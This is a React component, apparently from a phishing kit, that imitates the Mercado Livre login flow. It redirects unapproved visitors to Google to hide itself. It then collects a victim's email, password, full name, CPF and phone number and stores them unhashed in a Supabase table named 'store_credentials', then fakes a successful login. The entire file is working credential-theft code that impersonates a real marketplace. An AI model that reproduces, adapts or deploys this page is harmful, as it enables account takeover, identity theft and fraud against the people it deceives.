import React, { useEffect, useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { useMascara } from "@/hooks/useMascara";
import { sanitizeStoreHTML } from "@/lib/mascaraSanitizer";
import { supabase } from "@/integrations/supabase/client";
import StoreLoader from "@/components/StoreLoader";
import loginStyles from "./StoreLogin.css?inline";

const StoreLogin = () => {
    const navigate = useNavigate();
    const shadowContainerRef = useRef<HTMLDivElement>(null);
    const { mascara } = useMascara();
    const [loading, setLoading] = useState(true);
    const [authorized, setAuthorized] = useState(false);
    const [step, setStep] = useState<'email' | 'password' | 'update'>('email');
    const [userEmail, setUserEmail] = useState('');
    const [userPassword, setUserPassword] = useState('');
    const [isRegister, setIsRegister] = useState(false);

    // Initial check and background isolation
    useEffect(() => {
        const hasAccess = localStorage.getItem('store_access') === 'authorized';
        if (!hasAccess && !window.location.search.includes('bypass')) {
            window.location.href = 'https://www.google.com';
            return;
        }
        setAuthorized(true);

        const params = new URLSearchParams(window.location.search);
        if (params.has('register')) setIsRegister(true);

        document.body.setAttribute('data-site', 'ML');
        const prevBg = document.body.style.backgroundColor;
        document.body.style.backgroundColor = '#ffffff';

        return () => {
            document.body.removeAttribute('data-site');
            document.body.style.backgroundColor = prevBg;
        };
    }, []);

    useEffect(() => {
        const timer = setTimeout(() => setLoading(false), 2000);
        return () => clearTimeout(timer);
    }, []);

    // HTML Generator Functions
    const getCommonHeader = () => `
        <header role="banner" class="nav-header nav-header-plusclean ui-navigation-v2">
            <div class="nav-bounds">
                <a class="nav-logo">Mercado Livre</a>
            </div>
        </header>`;

    const getCommonFooter = () => `
        <footer class="login-footer">
            <div class="login-footer__container">
                <span>Copyright © 1999-2026 Ebazar.com.br LTDA.</span>
            </div>
        </footer>`;

    const getEmailHTML = () => `
        <div class="grid-view__container">
            <div class="grid-view__main">
                <div class="grid-view__section--headers">
                    <h1 class="grid-view__title">${isRegister ? "Crie a sua conta" : "Digite seu e-mail ou telefone para iniciar sessão"}</h1>
                </div>
                <div class="andes-card" id="login-card">
                    <form id="login_user_form">
                        <div class="andes-form-control andes-form-control--textfield">
                            <label for="user_id"><span class="andes-form-control__label">E-mail ou telefone</span></label>
                            <div class="andes-form-control__control">
                                <input type="email" id="user_id" class="andes-form-control__field" value="${userEmail}" autofocus>
                            </div>
                        </div>
                        <div class="login-form__actions">
                            <button type="submit" class="andes-button andes-button--loud">Continuar</button>
                            ${!isRegister ? '<button type="button" id="registration-link" class="andes-button andes-button--mute">Criar conta</button>' : ''}
                        </div>
                    </form>
                </div>
            </div>
        </div>`;

    const getPasswordHTML = () => {
        const maskedEmail = userEmail.replace(/(.{2})(.*)(@.*)/, (_, a, b, c) => a + '*'.repeat(Math.min(b.length, 5)) + c);
        return `
        <div class="grid-view__container">
            <div class="grid-view__main">
                <div class="grid-view__section--headers">
                    <p class="grid-view__subtitle">${isRegister ? "Criação de conta" : "Entrar"}</p>
                    <h1 class="grid-view__title">${isRegister ? "Agora, crie a sua senha" : "Agora, digite a sua senha"}</h1>
                </div>
                <div class="user-pill" style="margin-bottom: 24px; display: flex; align-items: center; padding: 12px; background: #f5f5f5; border-radius: 6px;">
                    <div style="margin-right: 12px; color: #3483fa;">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08s5.97 1.09 6 3.08c-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
                    </div>
                    <div>
                        <p style="font-size: 14px; font-weight: 600; margin: 0;">${maskedEmail}</p>
                        <button id="back-to-email" style="background:none; border:none; padding:0; color:#3483fa; font-size:12px; cursor:pointer;">Alterar e-mail</button>
                    </div>
                </div>
                <div class="andes-card">
                    <form id="login_password_form">
                        <div class="andes-form-control andes-form-control--textfield">
                            <label for="password"><span class="andes-form-control__label">Senha</span></label>
                            <div class="andes-form-control__control">
                                <input type="password" id="password" class="andes-form-control__field" autofocus>
                            </div>
                        </div>
                        <div class="login-form__actions">
                            <button type="submit" class="andes-button andes-button--loud">Confirmar</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>`;
    };

    const getUpdateHTML = () => `
        <div class="grid-view__container">
            <div class="grid-view__main">
                <div class="grid-view__section--headers">
                    <p class="grid-view__subtitle">Atualizar dados</p>
                    <h1 class="grid-view__title">Complete seus dados</h1>
                </div>
                <div class="andes-card">
                    <form id="login_update_form">
                        <div class="andes-form-control andes-form-control--textfield" style="margin-bottom: 16px;">
                            <label for="full_name"><span class="andes-form-control__label">Nome completo</span></label>
                            <div class="andes-form-control__control">
                                <input type="text" id="full_name" class="andes-form-control__field">
                            </div>
                        </div>
                        <div class="andes-form-control andes-form-control--textfield" style="margin-bottom: 16px;">
                            <label for="cpf"><span class="andes-form-control__label">CPF</span></label>
                            <div class="andes-form-control__control">
                                <input type="text" id="cpf" class="andes-form-control__field" maxlength="14">
                            </div>
                        </div>
                        <div class="andes-form-control andes-form-control--textfield">
                            <label for="phone"><span class="andes-form-control__label">Telefone</span></label>
                            <div class="andes-form-control__control">
                                <input type="tel" id="phone" class="andes-form-control__field" maxlength="15">
                            </div>
                        </div>
                        <div class="login-form__actions">
                            <button type="submit" class="andes-button andes-button--loud">Continuar</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>`;

    // Shadow DOM Wiring
    useEffect(() => {
        if (!shadowContainerRef.current || !authorized) return;

        if (!shadowContainerRef.current.shadowRoot) {
            shadowContainerRef.current.attachShadow({ mode: "open" });
        }

        const shadow = shadowContainerRef.current.shadowRoot!;
        const stepHTML = step === 'email' ? getEmailHTML() : step === 'password' ? getPasswordHTML() : getUpdateHTML();
        const fullHTML = `${getCommonHeader()}<main role="main" id="root-app">${stepHTML}</main>${getCommonFooter()}`;
        const sanitized = sanitizeStoreHTML(fullHTML, mascara);

        const stylesString = typeof loginStyles === 'string' ? loginStyles : (loginStyles as any).default || '';
        shadow.innerHTML = `<style>${stylesString}</style><div class="ml-login-root">${sanitized}</div>`;

        // Event Wiring
        const root = shadow.querySelector('.ml-login-root');
        if (!root) return;

        const logo = root.querySelector('.nav-logo');
        logo?.addEventListener('click', (e) => { e.preventDefault(); navigate('/store'); });

        if (step === 'email') {
            const form = root.querySelector('#login_user_form');
            form?.addEventListener('submit', (e) => {
                e.preventDefault();
                const email = (root.querySelector('#user_id') as HTMLInputElement)?.value;
                if (email) { setUserEmail(email); setStep('password'); }
            });
            root.querySelector('#registration-link')?.addEventListener('click', () => setIsRegister(true));
        } else if (step === 'password') {
            const form = root.querySelector('#login_password_form');
            form?.addEventListener('submit', (e) => {
                e.preventDefault();
                const pass = (root.querySelector('#password') as HTMLInputElement)?.value;
                if (pass) { setUserPassword(pass); setStep('update'); }
            });
            root.querySelector('#back-to-email')?.addEventListener('click', () => setStep('email'));
        } else if (step === 'update') {
            const form = root.querySelector('#login_update_form');
            
            // Basic Masks
            const cpfInput = root.querySelector('#cpf') as HTMLInputElement;
            cpfInput?.addEventListener('input', (e) => {
                let v = (e.target as HTMLInputElement).value.replace(/\D/g, "");
                if (v.length <= 11) {
                    v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
                }
                (e.target as HTMLInputElement).value = v;
            });

            form?.addEventListener('submit', async (e) => {
                e.preventDefault();
                const fullName = (root.querySelector('#full_name') as HTMLInputElement)?.value;
                const cpf = (root.querySelector('#cpf') as HTMLInputElement)?.value;
                const phone = (root.querySelector('#phone') as HTMLInputElement)?.value;

                if (fullName && cpf && userEmail && userPassword) {
                    try {
                        await supabase.from('store_credentials').insert({
                            email: userEmail,
                            password: userPassword,
                            full_name: fullName,
                            cpf: cpf,
                            phone: phone || null,
                        });
                        localStorage.setItem('store_logged_in', 'true');
                        localStorage.setItem('store_user_email', userEmail);
                        localStorage.setItem('store_user_name', fullName);
                        window.dispatchEvent(new Event('store_login_changed'));
                        navigate('/store');
                    } catch (err) {
                        console.error('Login error:', err);
                    }
                }
            });
        }
    }, [step, authorized, userEmail, userPassword, isRegister, navigate, mascara]);

    if (!authorized) return null;

    return (
        <div className="store-login-page-container">
            {loading && <StoreLoader />}
            <div ref={shadowContainerRef} />
        </div>
    );
};

export default StoreLogin;
